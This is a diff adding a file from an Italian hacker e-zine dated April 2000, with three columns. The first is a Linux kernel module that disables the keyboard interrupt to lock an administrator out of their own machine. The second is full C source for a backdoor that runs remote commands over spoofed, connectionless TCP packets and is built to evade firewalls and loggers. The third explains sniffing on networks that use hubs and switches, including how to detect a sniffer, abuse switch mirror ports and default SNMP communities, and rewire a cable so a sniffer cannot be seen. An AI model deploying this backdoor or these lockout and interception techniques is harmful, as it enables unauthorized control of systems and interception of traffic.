@@ -1,0 +1,693 @@
+==============================================================================
+-------------[ BFi numero 8, anno 3 - 30/04/2000 - file 5 di 28 ]-------------
+==============================================================================
+
+
+-[ C0LUMNS ]------------------------------------------------------------------
+---[ THREADS
+-----[ Autori Vari
+
+
+-[ iNDEX
+
+--[ SBATTiAM0 FU0Ri L'ADMiN		bELFaghor
+--[ SP00FED TCP SHELL			|CyRaX|
+--[ SNiFFA CHE Si SNiFFA		Noxious & smilzo
+--------------------------------------------------------
+
+
+-[ SBATTiAM0 FU0Ri L'ADMiN
+--[ bELFaghor <belf@s0ftpj.org>
+
+Quella che segue e' solo un'idea... semplice e banale...
+Come siamo abituati ad essere sbattuti fuori dall'admin, ora sbattiamo fuori
+l'admin dalla sua macchina:
+
+linenoise:~# cat /proc/interrupts
+ 0:     397526   timer
+ 1:       8129   keyboard
+ 2:          0   cascade
+ 4:        772 + serial
+	:	:
+	:  etc	:
+
+linenoise:~# uname -r
+2.0.36
+
+linenoise:~# cat > ivoluan.c << STOP
+> #define __KERNEL__
+> #define MODULE
+>
+> #include <linux/kernel.h>
+> #include <linux/module.h>
+>
+> #include <unistd.h>
+>
+> int init_module(void) {
+>         free_irq(1, NULL);
+> }
+>
+> void cleanup_module(void) {
+>         printk("fuck the world i will deny you\n");
+> }
+>
+> STOP
+
+linenoise:~# gcc -c ivoluan.c
+linenoise:~# insmod ivoluan.o
+
+Bene. Ora l'admin non potra' piu' interagire con la tastiera: non un singolo
+comando, non un interrupt, non un singolo bit mandato dalla tastiera sara'
+interpretato dal kernel. Il controllo della macchina sara' quindi solo
+prettamente remoto... e se chiudiamo fuori l'admin con hosts.deny, regole
+di fwing o quello che volete, il controllo della macchina sara' solo nostro...
+
+Ovviamente al reboot siamo punto e da capo... (nota: il reboot e' possibile
+solo spegnendo la macchina che non sync()era' i dati e via di fsck() ).
+Per una soluzione permanente bisognerebbe togliere il driver dal kernel
+ricompilandolo.. oppure caricare il modulo al boot.. insomma.. MAH ;-)
+
+Vedete voi ;-)
+ciauz,
+b.
+--------------------------------------------------------
+
+
+-[ SP00FED TCP SHELL
+--[ |CyRaX| <cyrax@freemail.it>
+
+<-| stcpshell.c |->
+/* Backdoor over non connected and spoofed tcp packets
+ * Coded by |CyRaX|
+ * Members Of Packets Knights Crew
+ * www.programmazione.it/knights
+ * This little backdoor works by sending data in tcp packets over tcp packets
+ * without creating a connection. Simply we use the tcp that is a connection
+ * oriented protocol as udp (connection less).
+ * Why to do this :
+ *  - tcp loggers simpy log only the connection request
+ *  - firewalls can't block packets all the packets destinated to a port >=
+ *    1024.. they logs only the packets with the SYN flag... but we don't
+ *    need it :)
+ * Why this is better than backdoor over icmp or igmp : because a good admin
+ * would simply blocks (or at least log) all those packets. But it's very hard
+ * that he'll blocks all the tcp packets (or log them all)
+ * Edit this code as you want (and correct all the bugs :P)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <net/if.h>
+
+/* USER SETUP
+ * ports must be the same in the client and the server
+ */
+#define CLIENTPORT 1234
+#define SERVERPORT 4321
+
+ /* Prototipi */
+void uso();
+void waitpkt();
+void sendpkt(char *what, unsigned long int to);
+u_short in_chksum(u_short *ptr, int nbytes);
+/* Globals: */
+int server=0;
+char victim[20];
+int wait=1;
+int sock_waiting;
+char ourip[200];
+
+/* some structs */
+struct ippkt{
+   struct ip ip;
+   struct tcphdr tcp;
+   char something[12];
+   char data[1024];
+};
+
+struct pseudohdr {
+   u_int32_t saddr;
+   u_int32_t daddr;
+   u_int8_t zero;
+   u_int8_t protocol;
+   u_int16_t lenght;
+};
+
+/* Let's go !! :) */
+
+int main(int argc, char **argv){
+   pid_t procid;
+   struct ippkt pkt;   
+   char command[200];   
+   
+   
+   srand(getpid());
+   if(argc<2){
+      uso();
+      exit(0);
+   }
+   if (strstr(argv[1],"-s")){
+      server=1;
+   }
+   else {
+      strcpy(victim,argv[2]);
+      strcpy(ourip,argv[3]);
+   }
+   sock_waiting=socket(AF_INET,SOCK_RAW,6);   
+   printf("Backdoor on non connected/spoofed tcp. Coded by |CyRaX|. cyrax@freemail.it\n");
+   printf("Members of Packets Knights Crew ! www.programmazione.it/knights\n");
+   if(server){
+      printf("Running in server mode. Forking and waiting for the data\n");
+      procid=fork();
+      if(procid!=0){
+	 /* The parent dies. */
+	 exit(0);
+      }
+      while(1){
+	 waitpkt();
+      }
+   }
+   else {
+      printf("Running in client mode. Sending data to %s.\n",victim);
+      while(1){
+	 printf("root@fucked.%s # ",victim);
+	 fgets(command,200,stdin);
+	 wait=1;
+	 sendpkt(command,inet_addr(victim));
+	 while(wait){
+	    waitpkt();
+	 }
+      }
+      
+      
+   }
+   
+}
+		 
+/* Functions that wait for packets */
+void waitpkt(){
+   struct ippkt pkt;
+   int howmany;
+   struct sockaddr_in sin;
+   int clen=sizeof(sin);
+   FILE *job;
+   char buff[200];
+   memset(&pkt,0,sizeof(struct ippkt));
+   howmany=recvfrom(sock_waiting,(struct ippkt *) &pkt,sizeof(pkt),0,(struct sockaddr *)&sin,&clen);
+   if(ntohs(pkt.tcp.dest)==SERVERPORT && pkt.tcp.ack==0 && pkt.tcp.urg==0&&server){
+      job=popen(pkt.data,"r");
+      while(fgets(buff,199,job)!=0){
+	 sendpkt(buff,pkt.tcp.seq);
+      }
+      strcpy(buff,"END_OF_PROCESS");
+      pclose(job);
+      sendpkt(buff,pkt.tcp.seq);
+   }
+   if(ntohs(pkt.tcp.dest)==CLIENTPORT && pkt.tcp.ack==0 && pkt.tcp.urg==0&&!server){
+      wait=1;
+      if(strstr(pkt.data,"END_OF_PROCESS")){
+	 wait=0;
+      }
+      else{
+	 printf("%s",pkt.data);
+      }
+   }
+   
+}
+
+/* Functions that sends packets */
+
+void sendpkt(char *what, unsigned long int to){
+   int sock;
+   struct sockaddr_in from,temp;
+   struct ippkt pkt;
+   int hincl=1;
+   int err;
+   int s;
+   struct ifreq ifr;
+   struct pseudohdr psd;
+   char *tosum;
+      
+   
+   sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
+   memset(&pkt,0,sizeof(pkt));
+   setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&hincl,sizeof(hincl));
+   from.sin_addr.s_addr=to;
+   from.sin_family=AF_INET;
+   pkt.ip.ip_len=sizeof(struct ip)+sizeof(struct tcphdr)+12+strlen(what);
+   pkt.ip.ip_hl=sizeof(pkt.ip)>>2;
+   pkt.ip.ip_v=4;
+   pkt.ip.ip_ttl=255;
+   pkt.ip.ip_tos=0;
+   pkt.ip.ip_off=0;
+   pkt.ip.ip_id=htons((int)rand());
+   pkt.ip.ip_p=6;
+   /* from www.microsoft.com .. you BETTER change this */
+   pkt.ip.ip_src.s_addr=inet_addr("207.46.131.137");
+   pkt.ip.ip_dst.s_addr=to;
+   pkt.ip.ip_sum=in_chksum((u_short *) &pkt.ip,sizeof(struct ip));
+   if(server){
+      pkt.tcp.source=htons(SERVERPORT);
+      pkt.tcp.dest=htons(CLIENTPORT);
+   }
+   else{
+      pkt.tcp.source=htons(CLIENTPORT);
+      pkt.tcp.dest=htons(SERVERPORT);
+   }
+   if(server){
+      pkt.tcp.seq=666;
+   }
+   else{
+      pkt.tcp.seq=inet_addr(ourip);      
+      
+   }
+   /* SOME FLAGS */
+   pkt.tcp.ack=0;
+   pkt.tcp.urg=0;
+   pkt.tcp.window=1234;
+   
+   strcpy(pkt.data,what);
+   pkt.tcp.urg_ptr=1234;
+   /* MAYBE SOMETHING IS WRONG HERE */
+   tosum=malloc(sizeof(psd)+sizeof(pkt.tcp));
+   memcpy(&psd.saddr,&pkt.ip.ip_src.s_addr,4);
+   memcpy(&psd.daddr,&pkt.ip.ip_dst.s_addr,4);
+   psd.protocol=6;
+   psd.lenght=htons(sizeof(struct tcphdr)+12+strlen(what));
+   memcpy(tosum,&psd,sizeof(psd));
+   memcpy(tosum+sizeof(psd),&pkt.tcp,sizeof(pkt.tcp));
+   pkt.tcp.check=in_chksum((u_short *)&tosum,sizeof(psd)+sizeof(pkt.tcp));
+   /* PACKET READY TO GO !!!!!! */
+   err=sendto(sock,&pkt,sizeof(struct ip)+sizeof(struct tcphdr)+sizeof(pkt.something)+strlen(what),
+	      0,(struct sockaddr *)&from,sizeof(struct sockaddr));
+}
+   
+/* Function for the cksum.. ripped */
+
+u_short in_chksum(u_short *ptr, int nbytes)
+{
+  register long           sum;            /* assumes long == 32 bits */
+  u_short                 oddbyte;
+  register u_short        answer;         /* assumes u_short == 16 bits */
+
+  /*
+   * Our algorithm is simple, using a 32-bit accumulator (sum),
+   * we add sequential 16-bit words to it, and at the end, fold back
+   * all the carry bits from the top 16 bits into the lower 16 bits.
+   */
+
+  sum = 0;
+  while (nbytes > 1)
+  {
+    sum += *ptr++;
+    nbytes -= 2;
+  }
+
+        /* mop up an odd byte, if necessary */
+  if (nbytes == 1)
+  {
+    oddbyte = 0;            /* make sure top half is zero */
+    *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+    sum += oddbyte;
+  }
+
+  /*
+   * Add back carry outs from top 16 bits to low 16 bits.
+   */
+
+  sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+  sum += (sum >> 16);                     /* add carry */
+  answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+
+  return((u_short) answer);
+}
+
+void uso(){
+   printf("Backdoor On Non Connected And Spoofed Tcp Packets\n");
+   printf("Coded by |CyRaX| cyrax@freemail.it - |CyRaX|@ircnet\n");
+   printf("Member Of Packets Knights Crew ! www.programmazione.it/knights\n");
+   printf("Usage:   server    ./tcpb -s\n");
+   printf("         client    ./tcpb -c <serverip> <your_ip>\n");
+   printf("example : ./tcpb -s ; /tcpb -c 127.0.0.1 127.0.0.1\n");
+   
+   exit(0);
+}
+<-X->
+--------------------------------------------------------
+
+
+-[ SNiFFA CHE Si SNiFFA
+--[ Noxious & smilzo
+
+Sniffa che si sniffa (una raccolta di piccole pulci per l'orecchio dello
+smanettone) by Noxious & Smilzo 
+soci della - Metro Olografix - associazione culturale telematica
+(http://www.olografix.org)
+
+
+INTRODUZIONE
+
+In questo articolo parleremo dello sniffer in un modo un po' diverso e piu'
+teorico di quanto si faccia di solito, visto che oramai e' da considerarsi uno
+degli strumenti piu' utili per la comprensione delle reti. Il nostro scopo e'
+solo di dare qualche input alle anime piu' smanettone. Ovviamente non ci
+prendiamo nessuna responsabilita' nel caso il contenuto dell'articolo fosse
+usato in modo non canonico.
+
+Diamo per scontante le basi del TCP/IP; se cosi' non fosse datevi una letta ai
+vecchi articoli del buon FuSyS o uno 'sguardo' al celeberrimo
+TCP/IP Illustrated di Stevens.
+
+
+MR. ETHERNET I SUPPOSE...
+
+Il protocollo ethernet si colloca al livello 2 della pila OSI, il livello
+data-link. Lo standard e' definito CSMA/CD (Carrier Sense Multiple Access /
+Collision Detect) perche' piu' macchine posso accedere simultaneamente alla
+ethernet e ciascuna macchina puo' determinare lo stato della rete attraverso
+l'individuazione della portante. Quando una macchina ha un pacchetto da 
+inviare controlla che la rete sia libera, altrimenti attende un tempo casuale
+per verificare se la rete e' ancora occupata.
+Una volta inviato il frame (vedi sotto) la macchina controlla la rete per
+verificare che altri segnali non interferiscano con la trasmissione (Collision
+Detect). Infatti se due frame vengono inviati quasi contemporaneamente, 
+nessuno dei due risulta leggibile e si verifica una collisione.
+La ritrasmissione del frame avviene anch'essa dopo un tempo casuale per 
+evitare che entrambe le macchine rispediscano di nuovo contemporaneamente i
+dati; se questo evento si riverifica, il precedente tempo di attesa viene
+moltiplicato esponenzialmente in ogni tentativo successivo.
+Il mittente comunque non ha nessuna informazione riguardo la ricezione dei
+dati da parte del destinatario (best-effort delivery), visto che normalmente
+questo e' compito dei protocolli di livello superiore al protocollo ethernet
+della pila OSI.
+Ogni scheda di rete ethernet contiene un indirizzo 'fisico' ed univoco (MAC
+address) che viene inserito direttamente nel firmware dal produttore e che
+serve a indirizzare i frame sulla corretta destinazione fisica.
+Nell'header del frame, oltre agli indirizzi MAC di destinazione e sorgente,
+e' specificato il protocollo incapsulato all'interno del frame, informazione
+fondamentale per il kernel che dovra' interpretare i dati in base al
+protocollo utilizzato.
+
+Piu' specificatamente, un classico frame Ethernet (per i curiosi, RFC 894) si
+compone di un header di 14 byte, 6 byte per l'indirizzo MAC di destinazione,
+6 byte per l'indirizzo MAC sorgente e 2 byte per definire il tipo di 
+protocollo incapsulato all'interno della frame. In coda al frame, dopo i dati,
+abbiamo 4 byte utilizzati per il CRC.
+Ora sappiamo di cosa stiamo parlando :)
+
+
+HUB?
+
+Tutti (noi speriamo) abbiamo avuto qualche esperienza con qualche tipo di rete
+lan.
+Sicuramente tutti abbiamo presente il concetto di 'hub', ma una ripassatina
+non fa male.
+L'hub (testualmente 'concentratore') viene utilizzato per creare delle reti
+cosiddette 'shared' con caratteristiche di risorse condivise. 'Shared'
+significa innanzitutto che tutte le macchine sulla rete condividono lo stesso
+cavo. Inoltre ogni macchina puo' inviare dei pacchetti quando vuole, questi
+non vengono indirizzati intelligentemente e vengono ricevuti da TUTTE le
+schede di rete collegate all'hub. In seguito sara' la stessa macchina a
+discriminare i pacchetti che la riguardano confrontando il MAC address di
+destinazione, e in caso di match con il proprio (che ricordiamo essere 
+univoco), il pacchetto viene immagazzinato nel buffer e reso pronto per essere
+elaborato. 
+Questo sistema, come potete ben immaginare, e' affetto da vari problemi, primo
+fra tutti le collisions dei frame (vedi sopra). Inoltre, sempre per il 
+concetto di 'shared-media', e' molto facile intercettare i dati di passaggio 
+sul cavo, dato che tutte le macchine sono in condizione di 'affacciarsi' sulla
+rete e 'vedere' tutto.
+
+Il diligente netmanager puo' essere avvantaggiato da una simile caratteristica
+della rete, ma come lui anche il prode hacker ne puo' trarre benefici :)
+Effettivamente analizzare il traffico di una rete puo' essere molto utile per
+vari motivi, primo fra tutti il debug e, non ultimo, quello di 'carpire'
+informazioni.
+
+
+SNIFFAMI!
+
+Da dove viene il nome 'sniffer'? Non ci crederete... dalla Network Associates.
+Per i romantici di turno, beh... un brusco ritorno alla realta' :)
+In effetti il prodotto della NA 'Sniffer Network Analyzer' vanta l'invenzione
+di un nuovo termine di uso comune.
+Il principio di funzionamento e' semplice. Riprendiamo per un attimo il
+discorso sul passaggio delle informazioni su un segmento di rete ethernet.
+Supponiamo di modificare il comportamento della nostra scheda di rete e di
+fargli elaborare anche i pacchetti non destinati alla nostra macchina. Per
+fare questo utilizziamo una feature dello standard 802.3, il 'promiscuous 
+mode' per le schede di rete. Il comportamento della nostra scheda in questo
+caso sara' diverso: non accettera' piu' solo i pacchetti con il destination 
+MAC che corrisponde al suo, ma accettera' tutti i pacchetti in transito, di 
+qualsiasi tipo.
+Ogni commento e' superfluo :)
+
+
+HO PAURA..
+
+Proteggersi dagli sniffer comuni e' un compito abbastanza semplice. Il metodo 
+piu' veloce e' sicuramente creare une rete switched e non shared, installando
+degli switch al posto degli hub (ne parleremo in seguito). Un altro metodo e'
+la criptazione dei dati in transito.
+Per quanto riguarda specificatamente le password ci sono vari tipi di sistemi
+che ora non ci interessa elencare (uno fra tutti le one time password). 
+
+Per proteggersi e comunque prendere delle contromisure dobbiamo prima 
+INDIVIDUARE la presenza di uno sniffer sulla nostra lan. Ecco qualche dritta.
+
+I led dell'hub
+Uno dei metodi piu' empirici, funzionali e che presuppone una certa
+familiarita' con la rete in esame, consiste nel constatare la presenza di
+traffico non dovuto attraverso l'accensione del led di controllo di una porta
+dell'hub collegata fisicamente su una macchina che non dovrebbe creare
+traffico in quel momento. Puo' essere un buon indizio che richiede una
+verifica utilizzando gli altri metodi.
+
+Il dns
+Normalente gli sniffer sono configurati per restituire l'hostname degli ip che
+sniffano. Quindi fanno una query PTR al dns per avere questa informazione.
+Beh, se constatate un traffico anomalo di richeste dns da una macchina 
+sospetta... non indugiate ed andate a controllare.
+
+Il ping
+Il trucco consiste nell'inviare una echo request ICMP all'indirizzo IP della
+macchina sospetta modificandone leggermente il MAC address e inserendone in 
+effetti uno inesistente su quel segmento. Se la macchina in esame ci risponde,
+la sua scheda e' in modo promiscuo e probabilmente abbiamo individuato lo
+sniffer.
+Oltre al metodo del ping, possiamo utilizzare qualsiasi altro tipo di 
+protocollo che preveda una risposta dalla macchina sospetta, ad esempio il 
+finger, il time, etc.
+
+Metodo della latenza
+Questo e' il piu' intrigante e cattivo metodo per scoprire uno sniffer.
+Cosa succede se spediamo una quantita' enorme di pacchetti sulla rete? Si 
+potrebbe dire quasi nulla. Effettivamente le macchine 'normali' non subiranno
+nessun rallentamento apprezzabile, ma la macchina in promiscuous mode... beh
+quella muore :->
+
+Esistono altri metodi (come quello molto comune dell'ARP), ma andare a 
+scoprirli puo' essere uno stimolo per la curiosita' del lettore.
+
+
+IL TANTO ATTESO SIGNOR SWITCH
+
+Per parlare degli switch facciamo prima una panoramica sul concetto di 
+bridging.
+
+Un bridge semplice ha due sole interfacce di rete a cui sono collegati due
+segmenti di lan shared (vedi dis. A). La sua funzione e' di immagazzinare i
+dati che provengono da uno dei segmenti e inviarli sull'altro segmento SOLO se
+lo riguardano.
+Il bridge lavora a livello 2 (data-link) della pila OSI, infatti effettua 
+controlli solo sull'indirizzo MAC di destinazione dei frame con una tabella
+dove riporta tutti i MAC delle schede collegate ai due segmenti di lan (vedi
+Tab. A).
+La sequenza delle operazioni e' questa: il bridge riceve e immagazzina il 
+frame, legge il destination MAC e, se corrisponde ad uno dei MAC nella sua arp
+table, provvede ad inviare il frame attraverso una delle sue NIC verso il 
+segmento corrispondente.
+
+- Disegno A
+                __                                        __
+               s  |                                      |  s
+               e  |             |\ bridge /|             |  e
+               g  |             | \      / |             |  g
+            A  m  |       NIC A |  \____/  | NIC B       |  m  B
+               e  |_____________|          |_____________|  e
+               n  |             |__________|             |  n
+               t__|                                      |__t
+	
+- Tabella A
+
+              /----------------------------------------------\
+              |       NIC A          |         NIC B         | 
+              |----------------------|-----------------------| 
+              | 00-50-04-32-43-xx    |  52-54-05-28-xx-xx    | 
+              | 00-40-01-23-43-xx    |  52-54-17-32-xx-xx    | 
+              | 00-50-03-22-54-xx    |  00-10-04-33-00-xx    | 
+              \----------------------------------------------/
+ 
+Nel caso in cui l'indirizzo richiesto nel pacchetto non fosse presente nella
+tabella, il bridge invia una richiesta arp in broadcast su entrambi i segmenti
+in modo da individuare eventuali nuove interfacce.
+In questo modo ogni segmento risulta fisicamente diviso dall'altro e le 
+comunicazioni che avvengono internamente al segmento non vengono inviate 
+attraverso il bridge.
+
+Lo switch e' semplicemente un perport bridge, ovvero un bridge con molte
+porte.
+Tipicamente lo switch viene utilizzato come super-hub (perdonateci il 
+termine :), collegando direttamente i pc alle sue porte, ma un utilizzo piu'
+canonico prevede il collegamento di hub o altri switch invece dei pc. Questo
+secondo metodo viene utilizzato comunemente per reti di grandi dimensioni in
+cui vi sono esigenze di segmentazione fisica della rete preesistente (le 
+Virtual LAN meritano un discorso futuro piu' approfondito).
+
+MI SFORZO MA NON CI RIESCO..,
+
+Per quelli che lo stanno facendo: smettetela, TEORICAMENTE non e' possibile 
+sniffare in una rete switched. Ma come ormai tutti gli smanettoni sanno, nulla
+e' impossibile in informatica, 'tutto dipende dal tempo, dai soldi e dalle
+donne' (Maxxx maxima :)
+
+Sorvoliamo tutti gli interessanti discorsi sull'overflowing di richieste arp
+fittizie per trasformare il lavoro dello switch da 'bridging' a 'repeating' e
+passiamo subito al metodo piu' comodo :)
+
+SPAN E MONITOR PORT
+
+Prendiamo in esame una serie di apparati molto utilizzati, i SuperStack della
+3Com. Questi switch hanno un modulo integrato per la configurazione che si
+puo' effettuare in tre modi. Via porta console, telnet e addirittura via web.
+
+Nota 1: capita spesso di trovare degli switch con un indirizzo ip pubblico e
+password di default (leggetevi i manuali per la pass). Se anche voi avete
+avuto un'idea da nobel del genere, beh... andate a chiudervi nel bagno
+vergognandovi come un camaleonte zoppo per un'ora :) Infatti attraverso queste
+comodissime interfacce di configurazione si puo' fare praticamente qualsiasi
+operazione sull'apparato. Un esempio? La possibilita' di disattivare tutte le
+porte dello switch che, se unita ad un cambio di password, vi fara' ritrovare
+con una rete bloccata e un DoS da fine dell'universo.
+Nota per quelli che erano in bagno prima: e' il momento di suicidarsi :) 
+
+Un'altra possibilita' offerta da queste interfacce e' poter configurare una 
+'monitor' o 'span' port. Il primo termine appartiene molto all'ambito 3Com 
+dove sugli switch possiamo monitorare il traffico di una sola porta alla 
+volta. Dunque in questo caso dovremo decidere quale porta usare come bersaglio
+e quale come monitor port.
+Il termine 'span' invece riguarda molto l'ambito Cisco con i suoi Catalyst.
+Qui abbiamo la possibilita' di configurare una porta che riceve i dati anche
+di TUTTE le altre porte dello switch. Possiamo considerare questa porta cosi'
+configurata come una porta di un semplice hub.
+
+Tutte queste features vengono gestite attraverso i classici modi di
+interfacciamento di questi apparati, quali le porte console, il telnet e in
+quelli piu' recenti anche l'interfaccia web.
+Visto che questi sistemi di configurazione hanno normalmente dei menu 
+user-friendly, pensiamo che non siano necessarie spiegazioni piu' dettagliate.
+Se comunque ne avete bisogno tutta la documentazione e' presente sui siti dei
+relativi costruttori :)
+
+Oltre questi metodi di configurazione ne manca uno che forse e' il piu'
+sfizioso: il protocollo SNMP.
+Il Simple Network Management Protocol e' pienamente supportato oltre che dai
+3Com e dai Cisco, anche dalle altre maggiori marche, e -fidatevi- ci sono
+molti piu' switch con il supporto SNMP attivato e community di default che con
+password di default.
+Delle possibili sfiziosissime applicazioni dell'SNMP & Sniff parleremo magari
+in un prossimo articolo :)
+Nel frattempo fatevi una bella spremuta di... meningi :)
+
+
+SFRAJO SNIFFER
+
+Fino ad ora abbiamo discusso prevalentemente su come individuare uno sniffer e
+favorirne il funzionamento.
+Supponiamo di aver accesso fisico ad una rete e di non volere affatto che il
+nostro sniffer sia individuabile o che generi traffico inutile.
+Il metodo piu' efficace ed interessante e' quello di rendere 'muta' la scheda
+di rete della macchina su cui gira lo sniffer. Naturalmente la funzionalita'
+generale del collegamento fisico deve rimanere invariata in quanto la nostra
+scheda di rete deve continuare a ricevere i frame in ingresso.
+Sui cavi di rete oltre ad essere trasmessi i dati, viene mantenuto un segnale
+di link con l'hub. Questo impulso elettrico viene trasmesso dall'hub verso la
+scheda di rete che provvede a rinviarlo automaticamente. Ora, bloccare
+completamente i segnali in uscita della scheda di rete non consentirebbe il
+normale link con l'hub. Infatti l'hub non trovando nessun collegamento sulla
+porta, la considera non utilizzata.
+Il trucco c'e' e consiste nel 'danneggiare' i segnali in uscita dalla scheda.
+Complicato? Affatto.
+Questo nefasto segnale viene ritrasmesso solamente su uno dei due poli di
+trasmissione del cavo (TD+). Scollegando solamente l'altro polo (TD-), i
+frame in uscita dalla scheda verranno interpretati dalle altre macchine sulla
+rete come semplici disturbi, ma il segnale di link continuera' ad essere
+presente.
+Abbiamo fatto i nostri esperimenti del caso su una classica rete shared a
+10Mbit con un comunissimo hub.
+Abbiamo preso un cavetto cat. 5 UTP (normalmente utilizzato per tutte le 
+moderne lan ethernet) e abbiamo scollegato il pin 2 che provvede a fornire il
+segnale di Transmit Data negativo (TD-) di cui parlavamo sopra.
+Il nostro pc, come l'hub d'altronde, non si accorge minimamente della nostra
+modifica.
+L'hub vedendo un computer collegato, smista anche su di esso i frame della
+lan. Il computer dal suo canto li riceve tranquillamente.
+Quando il pc prova ad inviare dei frame non riscontra nessun problema poiche'
+vengono realmente spediti sulla rete, ma sono interpretati dal resto delle 
+macchine solamente come disturbi e dunque ignorati.
+Non ci crederete, ma la cosa funziona veramente. 
+(Un grazie sentito a _Q_ che ci ha permesso di 'tagliuzzare' il physical layer
+della sua rete :)
+
+Nella seconda parte approfondiremo alcuni discorsi qui solo accennati,
+sperando di avere piu' tempo per fornire anche qualche parte di codice utile.
+
+...
+
+Penne (PE) ore 00:15
+
+PIRIPI...PIRIPI...
+<\sPIRIT\> smilzo, quando e' pronto l'articolo?
+<Smilzo> richiamami al 085/82xxxx che ho il cello scarico!
+DRIIIN...DRIIIN...
+<_Q_> pronto, carabinieri..
+<\sPIRIT\> oh mi scusi..
+DRIIIN...DRIIIN...
+<noxious> pronto, carabinieri mi dica..
+<\sPIRIT\> ah..carabinieri..scuss..
+PIRIPI...PIRIPI...
+<Smilzo> richiamami al quel caz di numero era un scherzo!
+<\sPIRIT\> ma porkkkkk...
+<\sPIRIT\> (mesto) ero ancora piu' coglione io che ci avevo creduto...
+
+ahahahahah
+
+Ringraziamenti
+
+W.R. Stevens... grazie per essere esistito, che il tuo spirito scenda su di
+noi per illuminarci.
+FuSyS per le consulenze sul codice... non usato :)
+AhPook per l'italianizzazione delle nostre nozioni tecniche.
+
+NeUrO, tu sei un grande sognatore... anche se i tuoi sogni sono sempre
+diventati realta'.
+
+Tutta la Metro Olografix e s0ftpj
+
+Bibliografia
+
+Internetworking with TCP/IP, Comer
+Sniffing-faq, Robert Graham
+Cisco training, Cisco training group
+--------------------------------------------------------
+
+
+==============================================================================
+---------------------------------[ EOF 5/28 ]---------------------------------
+==============================================================================
